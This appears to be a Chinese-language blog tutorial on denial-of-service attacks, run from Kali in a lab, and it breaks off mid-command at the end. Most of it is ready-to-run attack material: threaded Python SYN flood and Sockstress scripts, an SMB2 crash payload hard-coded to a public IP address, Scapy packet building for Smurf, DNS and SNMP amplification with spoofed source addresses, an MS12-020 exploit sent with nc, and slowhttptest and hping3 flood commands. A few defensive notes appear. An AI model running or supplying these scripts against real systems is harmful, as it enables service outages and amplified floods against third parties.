class="headerlink" title="1.scapy构造数据包"></a>1.scapy构造数据包</h4><h5 id="1-构造-IP-数据包"><a href="#1-构造-IP-数据包" class="headerlink" title="1. 构造 IP 数据包"></a><strong>1. 构造 IP 数据包</strong></h5><pre><code>&gt;&gt;&gt; i=IP()&gt;&gt;&gt; i.display()</code></pre><p><img src="E3mSTtG.png" alt="img"></p><pre><code>&gt;&gt;&gt; i.dst=&quot;10.10.10.132&quot;&gt;&gt;&gt; i.display()</code></pre><p><img src="KO66HGs.png" alt="img"></p><h5 id="2-构造TCP数据包"><a href="#2-构造TCP数据包" class="headerlink" title="2.构造TCP数据包"></a>2.构造TCP数据包</h5><pre><code>&gt;&gt;&gt; t=TCP()&gt;&gt;&gt; t.display()</code></pre><p><img src="DCJyqt6.png" alt="img"></p><pre><code>&gt;&gt;&gt; t.dport=22&gt;&gt;&gt; t.display()</code></pre><p><img src="y3zVkjb.png" alt="img"></p><h5 id="3-发送数据包需要构造成-IP-TCP-形式：i-t"><a href="#3-发送数据包需要构造成-IP-TCP-形式：i-t" class="headerlink" title="3. 发送数据包需要构造成 IP()/TCP() 形式：i/t"></a><strong>3. 发送数据包需要构造成 IP()/TCP() 形式：i/t</strong></h5><pre><code>&gt;&gt;&gt; sr1(i/t,verbose=1,timeout=2)</code></pre><p><img src="WNZ7i9P.png" alt="img"></p><h5 id="4-由于重建连接请求时会向服务器发送-reset-数据包重置连接请求，达不到攻击效果，则可以在本地设置防火墙规则："><a href="#4-由于重建连接请求时会向服务器发送-reset-数据包重置连接请求，达不到攻击效果，则可以在本地设置防火墙规则：" class="headerlink" title="4.由于重建连接请求时会向服务器发送 reset 数据包重置连接请求，达不到攻击效果，则可以在本地设置防火墙规则："></a><strong>4.由于重建连接请求时会向服务器发送 reset 数据包重置连接请求，达不到攻击效果，则可以在本地设置防火墙规则：</strong></h5><pre><code>iptables -A OUTPUT -p tcp --tcp-flags RST RST -d 10.10.10.132 -j DROPiptables -A OUTPUT -p tcp --tcp-flags RST RST -d 10.10.10.141 -j DROP</code></pre><h3 id="2-脚本攻击"><a href="#2-脚本攻击" class="headerlink" title="2. 脚本攻击"></a>2. 脚本攻击</h3><h4 id="脚本攻击-linux-服务器"><a href="#脚本攻击-linux-服务器" class="headerlink" title="脚本攻击 linux 服务器"></a>脚本攻击 linux 服务器</h4><p>1.脚本内容</p><pre><code>#!/usr/bin/python#coding=utf-8from scapy.all import*from time import sleepimport threadimport randomimport logginglogging.getLogger(&quot;scapy.runtime&quot;).setLevel(logging.ERROR)if len(sys.argv) != 4:    print &quot;用法: ./syn_flood.py [IP地址] [端口] [线程数]&quot;    print &quot;举例: ../syn_flood.py  1.1.1.1 80 20&quot;    sys.exit()target = str(sys.argv[1])port= int(sys.argv[2])threads = int(sys.argv[3])print&quot;正在执行 SYN flood 攻击，按 Ctrl+C 停止攻击。&quot;def synflood(target,port):    while 1:        x = random.randint(0,65535)        send(IP(dst=target)/TCP(dport=port,sport=x),verbose=0)        sr1(i/t,verbose=1,timeout=2)for x in range(0,threads):    thread.start_new_thread(synflood,(target,port))while 1:  sleep(1)</code></pre><p>2.执行脚本</p><pre><code>root@kali:~# python syn_flood.py 10.10.10.141 22 200# 由于重建连接请求时会向服务器发送 reset 数据包重置连接请求，达不到攻击效果，则可以在本地设置防火墙规则iptables -A OUTPUT -p tcp --tcp-flags RST RST -d 10.10.10.132 -j DROP</code></pre><p>抓包发现网络上充满数据包</p><p><img src="8QfyVAU.png" alt="img"></p><p>使用 ssh 连接 服务器发现无法响应</p><p><img src="8EWXAt7.png" alt="img"></p><p>在服务器使用 top 查看内存占用情况，发现占用极少</p><p><img src="wxcaUbA.png" alt="img"></p><p>在服务器查看连接，发现连接数非常多</p><p><img src="sHDzLpP.png" alt="img"></p><pre><code>查看 linux 服务器最大 TCP 连接数发现是 255 个netstat -n | awk &#39;/^tcp/ {++S[$NF]} END {for(a in S) print a, S[a]}&#39;</code></pre><h5 id="2-攻击windows机器"><a href="#2-攻击windows机器" class="headerlink" title="2.攻击windows机器"></a>2.攻击windows机器</h5><p>1.测试可用性</p><pre><code>root@kali:~# rdesktop 10.10.10.141</code></pre><p><img src="wYUMp3w.png" alt="img"></p><p>2.执行脚本</p><pre><code>root@kali:~# python syn_flood.py 10.10.10.141 3389 10# 由于重建连接请求时会向服务器发送 reset 数据包重置连接请求，达不到攻击效果，则可以在本地设置防火墙规则iptables -A OUTPUT -p tcp --tcp-flags RST RST -d 10.10.10.141 -j DROProot@kali:~# rdesktop 10.10.10.141</code></pre><p><img src="uH5y56U.png" alt="img"></p><p>winxp 的最大半开连接数只有 10 个</p><h4 id="泛洪攻击常伴随IP地址欺骗"><a href="#泛洪攻击常伴随IP地址欺骗" class="headerlink" title="泛洪攻击常伴随IP地址欺骗"></a>泛洪攻击常伴随IP地址欺骗</h4><p><img src="OIWj7fT.jpg" alt="img"></p><p>伪造源地址为 3.3.3.3，访问许多网站，将响应数据包发送给 3.3.3.3</p><ul><li>经常用于 DoS 攻击</li><li>根据 IP 头地址寻址<ul><li>伪造IP源地址</li></ul></li><li>便捷路由器过滤源IP<ul><li>入站、出站</li></ul></li><li>受害者可能是源、目的地址</li><li>绕过基于地址的验证</li><li>压力测试模拟多用户</li><li>上层协议（TCP序列号）</li></ul><h4 id="拒绝服务——Smurf攻击"><a href="#拒绝服务——Smurf攻击" class="headerlink" title="拒绝服务——Smurf攻击"></a>拒绝服务——Smurf攻击</h4><h5 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h5><ul><li>向广播地址发送伪造源地址的 ICMP echo Request （ping）包</li><li>LAN 所有计算机向伪造源地址返回响应包</li><li>对现代操作系统几乎无效（不响应目标为广播的ping）</li></ul><h5 id="2-测试攻击"><a href="#2-测试攻击" class="headerlink" title="2.测试攻击"></a>2.测试攻击</h5><pre><code>&gt;&gt;&gt; i=IP()&gt;&gt;&gt; i.display()</code></pre><p><img src="G91A6l1.png" alt="img"></p><pre><code>&gt;&gt;&gt; i.src=&quot;10.10.10.132&quot;&gt;&gt;&gt; i.dst=&quot;10.10.10.255&quot;</code></pre><p><img src="PjqvNVP.png" alt="img"></p><pre><code>&gt;&gt;&gt; p=ICMP()&gt;&gt;&gt; p.display()</code></pre><p><img src="Zr6n0yF.png" alt="img"></p><pre><code>&gt;&gt;&gt; r=send(i/p)</code></pre><p><img src="mdv0dml.png" alt="img"></p><pre><code># 使用一行发送：send(IP(dst=&quot;10.10.10.255&quot;,src=&quot;10.10.10.132&quot;)/ICMP(),count=100,verbose=1</code></pre><h3 id="拒绝服务–Sockstress-攻击"><a href="#拒绝服务–Sockstress-攻击" class="headerlink" title="拒绝服务–Sockstress 攻击"></a>拒绝服务–Sockstress 攻击</h3><h4 id="1-简介-1"><a href="#1-简介-1" class="headerlink" title="1.简介"></a>1.简介</h4><ul><li>2008年由Jack C.Louis 发现</li><li>针对TCP服务的拒绝服务攻击<ul><li>消耗被攻击目标系统资源</li><li>与攻击目标建立大量socket链接</li><li>完成三次握手，最后的ACK包window 大小为0 (客户端不接收数据)</li><li>攻击者资源消耗小(CPU、内存、带宽)</li><li>异步攻击，单机可拒绝服务高配资源服务器</li><li>Window 窗口实现的TCP 流控</li></ul></li></ul><h4 id="2-脚本攻击-1"><a href="#2-脚本攻击-1" class="headerlink" title="2.脚本攻击"></a>2.脚本攻击</h4><h5 id="1-python测试脚本"><a href="#1-python测试脚本" class="headerlink" title="1.python测试脚本"></a>1.python测试脚本</h5><pre><code>#!/usr/bin/python#coding=utf-8from scapy.all import*from time import sleepimport threadimport randomimport loggingimport osimport signalimport sysimport signallogging.getLogger(&quot;scapy.runtime&quot;).setLevel(logging.ERROR)if len(sys.argv) != 4:    print &quot;用法: ./sockstress.py [IP地址] [端口] [线程数]&quot;    print &quot;举例: ../sockstress.py  1.1.1.1 80 20 # 请确定被攻击端口处于开放状态&quot;    sys.exit()target = str(sys.argv[1])dstport= int(sys.argv[2])threads = int(sys.argv[3])## 攻击函数def sockstress(target,dstport) :    while 0 == 0:        try:            x = random.randint(0,65535)            response = sr1(IP(dst=target)/TCP(sport=x,dport=dstport,flags = &#39;S&#39;),timeout=1,verbose=0)            send(IP(dst=target)/TCP(dport=dstport,sport=x,window=0,lags=&#39;A&#39;,ack=(response[TCP].seq + 1) )/&#39;\x00\x00&#39;,verbose=0)        except:            pass## 停止攻击函数def shutdown(signal,frame):    print &quot;正在修复 iptables 规则&quot;    os.system(&#39;iptables -D OUTPUT -p tcp --tcp-flags RST RST -d &#39;+ target +&#39; -j DROP&#39;)    sys.exit()## 添加iptables规则os.system(&#39;iptables -A OUTPUT -p tcp --tcp-flags RST RST -d &#39;+ target +&#39; -j DROP&#39;)signal.signal(signal.SIGINT, shutdown)## 多线程攻击print &quot;\n攻击正在进行...按 Ctrl+C 停止攻击&quot;for x in range(0,threads):    thread.start_new_thread(sockstress, (target,dstport))##永远执行while 0 == 0:    sleep(1)</code></pre><ul><li><p>测试结果</p><pre><code># 查看系统连接数netstat | grep ESTABLISHED | wc -l</code></pre></li></ul><p><img src="zdOuFdq.png" alt="img"></p><h5 id="2-C攻击脚本"><a href="#2-C攻击脚本" class="headerlink" title="2.C攻击脚本"></a>2.C攻击脚本</h5><ul><li>下载编译</li></ul><p><a href="https://github.com/defuse/sockstress" target="_blank" rel="noopener">github 下载地址</a></p><pre><code>gcc -Wall -c sockstress.cgcc -pthread -o sockstress sockstress.o./sockstress 10.10.10.132:80 eth0./sockstress 10.10.10.132:80 eth0 -p payloads/http防火墙规则iptables -A OUTPUT -p TCP --tcp-flags rst rst -d 10.10.10.132 -j DROP</code></pre><ul><li><p>查看攻击效果</p><pre><code>netstat -tulnp | grep ESTABLISHED | wc -lfreetop</code></pre></li></ul><h4 id="3-防御措施"><a href="#3-防御措施" class="headerlink" title="3.防御措施"></a>3.防御措施</h4><ul><li>直到今天sockstress攻击仍然是一种很有效的DOS攻击方式</li><li>由于建立完整的TCP三步握手，因此使用syn cookie防御无效</li><li>根本的防御方法是采用白名单(不实际)</li><li>折中对策限制单位时间内每IP建的TCP连接数<ul><li>封杀每30秒与 80 端口建立连接超过 10 个的IP地址</li><li>iptables -I INPUT -p tcp –dport 80 -m state–state NEW -m recent–set</li><li>iptables -I INPUT-p tcp -dport 80 -m state-state NEW-m recent -update–seconds 30 -hitcount 10 j DROP</li><li>以上规则对DDOS攻击无效</li></ul></li></ul><h3 id="拒绝服务–TearDrop-攻击"><a href="#拒绝服务–TearDrop-攻击" class="headerlink" title="拒绝服务–TearDrop 攻击"></a>拒绝服务–TearDrop 攻击</h3><h4 id="1-简介-2"><a href="#1-简介-2" class="headerlink" title="1.简介"></a>1.简介</h4><ul><li>主要针对早期微软操作系统（95、98、3.x、nt）<ul><li>近些年有人发现对 2.x 版本的安卓系统、6.0 IOS 系统攻击有效</li></ul></li><li>原理很有趣<ul><li>使用 IP 分段便宜实现分段覆盖，接收端处理分段覆盖时可被拒绝服务</li></ul></li><li>攻击效果<ul><li>被攻击者蓝屏、重启、卡死</li></ul></li></ul><p><img src="w9pzlfZ.png" alt="img"></p><ul><li>Ping大包，比较正常分段与teardrop攻击流量的区别</li><li>针对早期windows系统SMB协议的攻击<ul><li>teardrop_smb.py</li></ul></li><li>针对Android.IOS 系统的攻击<ul><li>teardrop_androidios.py</li></ul></li><li>攻击向量并不确定，要视具体协议分析</li></ul><h4 id="2-攻击目标"><a href="#2-攻击目标" class="headerlink" title="2.攻击目标"></a>2.攻击目标</h4><p>泪滴攻击是一种拒绝服务（DoS）攻击，涉及将碎片数据包发送到目标机器。由于接收这些数据包的机器由于TCP / IP碎片重组错误而无法重新组装，因此数据包相互重叠，导致目标网络设备崩溃。这通常发生在较早的操作系统上，例如Windows 3.1x，Windows 95，Windows NT和2.1.63之前版本的Linux内核。</p><p>IP报头中的一个字段是“片段偏移量”字段，指示包含在分段数据包中的数据相对于原始数据包中的数据的起始位置或偏移量。如果一个分片数据包的偏移量和大小之和不同于下一个分片数据包的偏移量和大小之和，则数据包重叠。发生这种情况时，易受泪滴攻击的服务器无法重新组装数据包 - 从而导致拒绝服务状况。</p><h4 id="3-攻击脚本"><a href="#3-攻击脚本" class="headerlink" title="3.攻击脚本"></a>3.攻击脚本</h4><pre><code>#!/usr/bin/python# When SMB2.0 recieve a &quot;&amp;&quot; char in the &quot;Process Id High&quot;# SMB header field it dies with a# PAGE_FAULT_IN_NONPAGED_AREA# filename: teardrop-attack-smb.pyimport sysfrom socket import socketfrom time import sleep#host = sys.argv[1], 445#host = &quot;192.168.33.13&quot;, 445host = &quot;217.113.205.53&quot;, 445buff = (&quot;\x00\x00\x00\x90&quot; # Begin SMB header: Session message&quot;\xff\x53\x4d\x42&quot; # Server Component: SMB&quot;\x72\x00\x00\x00&quot; # Negociate Protocol&quot;\x00\x18\x53\xc8&quot; # Operation 0x18 &amp; sub 0xc853&quot;\x00\x26&quot;# Process ID High: --&gt; :) normal value should be &quot;\x00\x00&quot;&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xfe&quot;&quot;\x00\x00\x00\x00\x00\x6d\x00\x02\x50\x43\x20\x4e\x45\x54&quot;&quot;\x57\x4f\x52\x4b\x20\x50\x52\x4f\x47\x52\x41\x4d\x20\x31&quot;&quot;\x2e\x30\x00\x02\x4c\x41\x4e\x4d\x41\x4e\x31\x2e\x30\x00&quot;&quot;\x02\x57\x69\x6e\x64\x6f\x77\x73\x20\x66\x6f\x72\x20\x57&quot;&quot;\x6f\x72\x6b\x67\x72\x6f\x75\x70\x73\x20\x33\x2e\x31\x61&quot;&quot;\x00\x02\x4c\x4d\x31\x2e\x32\x58\x30\x30\x32\x00\x02\x4c&quot;&quot;\x41\x4e\x4d\x41\x4e\x32\x2e\x31\x00\x02\x4e\x54\x20\x4c&quot;&quot;\x4d\x20\x30\x2e\x31\x32\x00\x02\x53\x4d\x42\x20\x32\x2e&quot;&quot;\x30\x30\x32\x00&quot;)s = socket()s.connect(host)s.send(buff)s.close()</code></pre><h4 id="拒绝服务–DNS-放大攻击"><a href="#拒绝服务–DNS-放大攻击" class="headerlink" title="拒绝服务–DNS 放大攻击"></a>拒绝服务–DNS 放大攻击</h4><h4 id="1-简介-3"><a href="#1-简介-3" class="headerlink" title="1.简介"></a>1.简介</h4><ul><li>产生大流量的攻击方法<ul><li>单机的带宽优势</li><li>巨大单机数量形成的流量汇聚</li><li>利用协议特性实现放大效果的流量</li></ul></li><li>DNS协议放大效果<ul><li>查询请求流量小，但响应流量可能非常巨大</li><li>dig ANY hp.com @202 106.0.20 (流量放大约8倍)</li></ul></li><li>攻击原理<ul><li>伪造源地址为被攻击目标地址，向递归域名查询服务器发起查询</li><li>DNS服务器成为流量放大和实施攻击者，大量DNS服务器实现DDOS</li></ul></li></ul><h4 id="2-攻击"><a href="#2-攻击" class="headerlink" title="2.攻击"></a>2.攻击</h4><pre><code>root@kali:~# dig any baidu.com @114.114.114.114</code></pre><p>发送60字节长度，返回216字节长度</p><p><img src="GqPGP9F.png" alt="img"></p><h4 id="3-Scapy构造攻击数据包原理"><a href="#3-Scapy构造攻击数据包原理" class="headerlink" title="3.Scapy构造攻击数据包原理"></a>3.Scapy构造攻击数据包原理</h4><ul><li>IP/UDP/DNS/DNS 查询内容</li></ul><p><img src="px5Ihn0.png" alt="img"></p><ul><li>结合IP地址欺骗，利用大量 DNS 服务器做傀儡攻击目标</li></ul><h4 id="4-构造数据包过程"><a href="#4-构造数据包过程" class="headerlink" title="4.构造数据包过程"></a>4.构造数据包过程</h4><p>1.构造 IP 数据包</p><pre><code>&gt;&gt;&gt; i=IP()&gt;&gt;&gt; i.display()</code></pre><p><img src="z1OV3Jv.png" alt="img"></p><pre><code>&gt;&gt;&gt; i.dst=&quot;114.114.114.114&quot;&gt;&gt;&gt; i.display()</code></pre><p><img src="3MXZboo.png" alt="img"></p><p>2.构造UDP数据包</p><pre><code>&gt;&gt;&gt; u=UDP()&gt;&gt;&gt; u.display()</code></pre><p><img src="14c4SzU.png" alt="img"></p><p>3.构造 DNS 数据包</p><pre><code>&gt;&gt;&gt; d=DNS()&gt;&gt;&gt; d.display()</code></pre><p><img src="aZfTrYu.png" alt="img"></p><pre><code>&gt;&gt;&gt; d.rd=1&gt;&gt;&gt; d.qdcount=1&gt;&gt;&gt; d.display()</code></pre><p><img src="aBZdHNP.png" alt="img"></p><p>4.设置查询目标</p><pre><code>&gt;&gt;&gt; q=DNSQR()&gt;&gt;&gt; q.display()</code></pre><p><img src="qcAPHGS.png" alt="img"></p><pre><code>&gt;&gt;&gt; q.qname=&#39;qq.com&#39;&gt;&gt;&gt; q.qtype=255   #（代表any）</code></pre><p><img src="DiDX3Nk.png" alt="img"></p><pre><code>&gt;&gt;&gt; d.qd=q   # 设置目标&gt;&gt;&gt; d.display()</code></pre><p><img src="ucWhz05.png" alt="img"></p><p>5.拼接数据包</p><pre><code>&gt;&gt;&gt; r=(i/u/d)&gt;&gt;&gt; r</code></pre><p><img src="BYH2G1x.png" alt="img"></p><pre><code>&gt;&gt;&gt; r.display()&gt;&gt;&gt; sr1(r)</code></pre><p><img src="mjWweAd.png" alt="img"></p><pre><code>&gt;&gt;&gt; i.src=&quot;10.10.10.141&quot;&gt;&gt;&gt; r=(i/u/d)&gt;&gt;&gt; r.display()</code></pre><p>6.发送数据包</p><pre><code>&gt;&gt;&gt; send(r)</code></pre><p>发送 60 字节的数据包，返回 2；l30 字节的数据包</p><p><img src="j8EXlRY.png" alt="img"></p><h3 id="拒绝服务——SNMP服务"><a href="#拒绝服务——SNMP服务" class="headerlink" title="拒绝服务——SNMP服务"></a>拒绝服务——SNMP服务</h3><h4 id="1-简介-4"><a href="#1-简介-4" class="headerlink" title="1.简介"></a>1.简介</h4><ul><li>简单网络管理协议</li><li>Simmple Network Management Protocol<ul><li>一般用来监控和管理网络设备</li></ul></li><li>服务端口UDP 161/162<ul><li>管理站(manager/客户端)、被管理设备(agent/服务端)</li><li>管理信息数据库(MIB) 是一个信息存储库，包含管理代理中的有关配置和性能的数据，按照不同分类，包含分属不同组的多个数据对象</li><li>每一个节点都有一个对象标识符(OID) 来唯一的标识一IETF定义便准的MIB库厂家自定义MIB库</li></ul></li><li>攻击原理</li><li>请求流量小，查询结果返回流量大<ul><li>结合伪造源地址实现攻击</li></ul></li></ul><h4 id="2-安装SNMP"><a href="#2-安装SNMP" class="headerlink" title="2.安装SNMP"></a>2.安装SNMP</h4><ul><li>安装 SNMP，定义 community</li></ul><p><img src="okOSYrp.png" alt="img"></p><p><img src="TZf6kGU.png" alt="img"></p><p><img src="aH8IJJ2.png" alt="img"></p><h4 id="3-scapy构造数据包"><a href="#3-scapy构造数据包" class="headerlink" title="3.scapy构造数据包"></a>3.scapy构造数据包</h4><ul><li>流程</li></ul><p><img src="28X1RdW.png" alt="img"></p><ul><li>步骤</li></ul><p><strong>构造 IP 数据包</strong></p><pre><code>&gt;&gt;&gt; i=IP()&gt;&gt;&gt; i.dst=&quot;10.10.10.142&quot;&gt;&gt;&gt; i.display()</code></pre><p><img src="mDZkeVN.png" alt="img"></p><p><strong>构造 UDP 数据包</strong></p><pre><code>&gt;&gt;&gt; u=UDP()&gt;&gt;&gt; u.dport=161&gt;&gt;&gt; u.sport=161</code></pre><p><img src="wq7hyEF.png" alt="img"></p><p><strong>构造 SNMP 数据包</strong></p><pre><code>&gt;&gt;&gt; s=SNMP()</code></pre><p><img src="LGtwfwK.png" alt="img"></p><p><strong>设置放大倍数</strong></p><pre><code>&gt;&gt;&gt; b=SNMPbulk()&gt;&gt;&gt; b.max_repetitions=100&gt;&gt;&gt; b.varbindlist=[SNMPvarbind(oid=ASN1_OID(&#39;1.3.6.1.2.1.1&#39;)),SNMPvarbind(oid=ASN1_OID(&#39;1.3.6.1.2.1.19.1.3&#39;))]&gt;&gt;&gt; b.display()</code></pre><p><img src="9Z7Rq86.png" alt="img"></p><pre><code>&gt;&gt;&gt; s.display()</code></pre><p><img src="3m6lmhQ.png" alt="img"></p><p><strong>设置 SNMP 数据包</strong></p><pre><code>&gt;&gt;&gt; s.PDU=b&gt;&gt;&gt; s.display()</code></pre><p><img src="d0jMjxp.png" alt="img"></p><p><strong>合成完整数据包</strong></p><pre><code>&gt;&gt;&gt; r=(i/u/s)&gt;&gt;&gt; r.display()</code></pre><p><strong>发送数据包</strong></p><pre><code>&gt;&gt;&gt; sr1(r)</code></pre><p>发送 98 字节，返回 4534 字节的数据包</p><p><img src="nJUfGfh.png" alt=""></p><p><strong>测试放大200倍效果</strong></p><pre><code>&gt;&gt;&gt; b.max_repetitions=200&gt;&gt;&gt; s.PDU=b&gt;&gt;&gt; s.display()</code></pre><p><img src="1deTNBV.png" alt="img"></p><pre><code>&gt;&gt;&gt; r=(i/u/s)&gt;&gt;&gt; r.display()&gt;&gt;&gt; sr1(r)</code></pre><p>发送 99 字节，返回 8894 字节</p><p><img src="e2RFmyd.png" alt="img"></p><h3 id="拒绝服务——NTP-放大攻击"><a href="#拒绝服务——NTP-放大攻击" class="headerlink" title="拒绝服务——NTP 放大攻击"></a>拒绝服务——NTP 放大攻击</h3><h4 id="1-简介-5"><a href="#1-简介-5" class="headerlink" title="1.简介"></a>1.简介</h4><ul><li>网络时间协议<ul><li>Network Time Protocol</li><li>保证网络设备时间同步</li><li>电子设备互相干扰导致时钟差异越来越大</li><li>影响应用正常运行、日志审计不可信</li><li>服务端口UDP 123</li></ul></li><li>攻击原理<ul><li>NTP 服务提monlist (MON_GETLIST) 查询功能<ul><li>监控NTP 服务器的状况 </li></ul></li></ul></li><li>客户端查询时，NTP服务器返回最后同步时间的600 个客户端IP</li><li>每6个IP一个数据包，最多100个数据包(放大约100倍)</li></ul><h4 id="2-扫描NTP服务器"><a href="#2-扫描NTP服务器" class="headerlink" title="2.扫描NTP服务器"></a>2.扫描NTP服务器</h4><p>1.服务器安装 ntp</p><pre><code>root@xu:~# apt-get install ntproot@xu:~# netstat -tulnp | grep 123</code></pre><p>2.kali扫描发现http服务器</p><pre><code>root@kali:~# nmap -sU -p 123 10.10.10.0/24 --openroot@kali:~# nmap -sU -p 123 -sV 10.10.10.138</code></pre><p>3.kali 扫描发现漏洞</p><pre><code>root@kali:~# ntpdc -n -c monlist 10.10.10.13810.10.10.138: timed out, nothing received***Request timed out    # 说明不存在漏洞</code></pre><p>4.配置 ntp 服务器配置</p><pre><code>注释 38 和 39行# restrict -4 default kod notrap nomodify nopeer noquery limited# restrict -6 default kod notrap nomodify nopeer noquery limitedroot@xu:~# /etc/init.d/ntp restart</code></pre><p>5.kali 扫描发现漏洞</p><pre><code>root@kali:~# ntpdc -n -c monlist 10.10.10.138root@kali:~# ntpq -c rv 10.10.10.138root@kali:~# ntpdc -c sysinfo 10.10.10.138</code></pre><h4 id="3-防御策略"><a href="#3-防御策略" class="headerlink" title="3.防御策略"></a>3.防御策略</h4><ul><li>NTP 攻击策略<ul><li>升级到 ntpd 4.2.7p26 及以上版本（默认关闭 monlist 查询）</li><li>手动关闭 monlist 查询功能</li></ul></li></ul><h3 id="拒绝服务–应用层DoS-攻击"><a href="#拒绝服务–应用层DoS-攻击" class="headerlink" title="拒绝服务–应用层DoS 攻击"></a>拒绝服务–应用层DoS 攻击</h3><ul><li>应用服务漏洞<ul><li>服务代码存在漏洞，遇异常提交数据时程序崩溃</li><li>应用处理大量并发请求能力有限，被拒绝的是应用或OS</li></ul></li><li>缓冲区溢出漏洞<ul><li>向目标函数随机提交数据，特定情况下数据覆盖临近寄存器或内存</li><li>影响: 远程代码执行、DOS</li><li>利用模糊测试方法发现缓冲区溢出漏洞</li></ul></li><li>CesarFTP 0.99 服务漏洞<ul><li>ftp_fuzz.py # MKD/RMD</li></ul></li><li>MS12-020 远程桌面协议DOS漏洞</li></ul><h4 id="2-攻击测试-MS12-020"><a href="#2-攻击测试-MS12-020" class="headerlink" title="2. 攻击测试 MS12-020"></a>2. 攻击测试 MS12-020</h4><pre><code>root@kali:~# searchsploit ms12-020root@kali:~# cp /usr/share/exploitdb/exploits/windows/dos/18606.txt .root@kali:~# mv 18606.txt  MS12-020.txtroot@kali:~# leafpad MS12-020.txt root@kali:~# nc 10.10.10.141 3389 &lt; termdd_1.dat</code></pre><h4 id="3-Slowhttptest"><a href="#3-Slowhttptest" class="headerlink" title="3. Slowhttptest"></a>3. Slowhttptest</h4><ul><li><p>Slowhttptest (源自google)</p><ul><li>低带宽应用层慢速DOS攻击(相对于CC等快速攻击而言的慢速)</li><li>最早由Python编写，跨平台支持(Linux、win、Cygwin、OSX)</li><li>尤其擅长攻击apache.tomcat (几乎百发百中)</li></ul></li><li><p>攻击方法</p><ul><li>Apache Range Header attack<ul><li>客户端传输大文件时，体积查过HTTP Body大小限制时进行分段</li><li>耗尽服务器CPU、内存资源</li></ul></li></ul></li><li><p>ulimite -n 70000</p></li><li><p>HTTP Post 攻击模式</p><ul><li>slowhttptest -c 1000 -B -g -o body_stats -i 110 -r 200 -s 8192 -t FAKEVERB -u <a href="http://10.10.10.132/" target="_blank" rel="noopener">http://10.10.10.132</a> -x 10 -p 3</li></ul></li><li><p>slowloris 攻击模式</p><ul><li>slowhttptest -c 1000 -H -g -o header_stats -i 10 -r 200 -t GET -u <a href="http://10.10.10.132/" target="_blank" rel="noopener">http://10.10.10.132</a> -x 24 -p 3</li></ul></li><li><p>支持代理</p></li><li><p>大量应用服务器和安全设备都无法防护慢速攻击</p></li></ul><p><img src="Zc2XbBy.jpg" alt="img"></p><h4 id="4-攻击测试"><a href="#4-攻击测试" class="headerlink" title="4.攻击测试"></a>4.攻击测试</h4><pre><code>root@kali:~# slowhttptest -c 60000 -B -g -o body_stats -i 110 -r 200 -s 8192 -t FAKEVERB -u http://10.10.10.132 -x 10 -p 3 -l 999999</code></pre><p><img src="z8Bx42G.png" alt="img"></p><p><img src="ptFr6br.png" alt="img"></p><pre><code>root@kali:~# slowhttptest -c 1000 -H -g -o my_header_stats -i 10 -r 200 -s 8192 -t GET -u http://10.10.10.132 -x 10 -p 3</code></pre><p><img src="q8f1NkR.png" alt="img"></p><pre><code>root@kali:~# man slowhttptest</code></pre><h3 id="拒绝服务攻击工具"><a href="#拒绝服务攻击工具" class="headerlink" title="拒绝服务攻击工具"></a>拒绝服务攻击工具</h3><h4 id="1-rudy"><a href="#1-rudy" class="headerlink" title="1.rudy"></a>1.rudy</h4><h5 id="1-简介-6"><a href="#1-简介-6" class="headerlink" title="1.简介"></a>1.简介</h5><ul><li>慢速应用层HTTP POST攻击，与slowhttptest原理相同</li><li>每次只传输一个字节的数据、</li><li>美剧黑客军团”中曾提到此攻击手段</li><li>攻击有表单WEB页面，攻击时需指定攻击的参数名称</li><li><a href="https://sourceforge.net/projects/r-u-dead-yet/" target="_blank" rel="noopener">https://sourceforge.net/projects/r-u-dead-yet/</a></li></ul><h5 id="2-测试"><a href="#2-测试" class="headerlink" title="2.测试"></a>2.测试</h5><pre><code>root@kali:~/rudy# lsBeautifulSoup.py   README          r-u-dead-yet-v2.2.py  socks.pycBeautifulSoup.pyc  rudeadyet.conf  socks.py</code></pre><p>修改配置文件</p><p><img src="tdPvToI.png" alt="img"></p><pre><code>root@kali:~/rudy# ./r-u-dead-yet-v2.2.py</code></pre><p><img src="ilCKVV2.png" alt="img"></p><p><img src="eo46mKo.png" alt="img"></p><h4 id="Hping3"><a href="#Hping3" class="headerlink" title="Hping3"></a>Hping3</h4><h5 id="1-简介-7"><a href="#1-简介-7" class="headerlink" title="1.简介"></a>1.简介</h5><ul><li><p>几乎可以定制发送任何 TCP/IP 数据包，用于测试 FW、端口扫描、性能测试</p></li><li><p>syn flood 攻击</p><ul><li>hping3 -c 1000 -d 120 -S -w 64 -p 80 –flood –rand-source 10.10.10.132</li><li>hping3 -S -P -U -p 80 –flood –rand-source 10.10.10.132</li><li>hping3 -SARFUP -p 80 –flood –rand-source 10.10.10.132 (TCP Flood)</li></ul></li><li><p>ICMP Flood 攻击</p><ul><li>hping3 -q -n -a 1.1.1.1 –icmp -d 200 –flood 10.10.10.132</li></ul></li><li><p>UDP Flood 攻击</p><ul><li>hping3 -a 1.1.1.1 –udp -s 53 -d 100 -p 53 –flood 10.10.10.132</li></ul></li></ul><h5 id="2-攻击-1"><a href="#2-攻击-1" class="headerlink" title="2.攻击"></a>2.攻击</h5><ul><li><p>syn_flood 攻击</p><pre><code>root@kali:~# hping3 -c 1000 -d 120 -S -w 64 -p 80 --flood --rand-source 10.10.10.132</code></pre></li></ul><p><img src="ptoKirq.png" alt="img"></p><pre><code>hping3 -S -P -U -p 80 --flood --rand-source 10.10.10.132</code></pre><p><img src="qykXjba.png" alt="img"></p><ul><li><p>tcp_flood 攻击</p><pre><code>root@kali:~# hping3 -SARFUP -p 80 --flood --rand-source 10.10.10.132</code></pre></li></ul><p><img src="TX0DsTz.png" alt="img"></p><ul><li><p>icmp_flood 攻击</p><pre><code>-a 伪造源地址root@kali:~# hping3 -q -n -a 1.1.1.1 --icmp -d 200 --flood 10.10.10.132</code></pre><p><img src="j82vMQQ.png" alt="img"></p></li><li><p>udp_flood 攻击</p><pre><code>root@kali:~# hping3 -a 1.1.1.1 --udp -s 53 -d 100 -p 53 --flood 10.10.10.132</code></pre><p><img src="yh6OGJ9.png" alt="img"></p></li></ul><h3 id="LAND攻击"><a href="#LAND攻击" class="headerlink" title="LAND攻击"></a>LAND攻击</h3><ul><li><p>特殊种类的 SYN Flood 攻击</p></li><li><p>源地址和目的地址都是靶机IP，受害者和自己完成三次握手</p></li><li><p>hping3 -n -a 10.10.10.132 -S -d 100 -p 80 –flood 10.10.10.132</p><pre><code>root@kali:~# hping3 -n -a 10.10.10.132 -S -d 100 -p 80 --flood 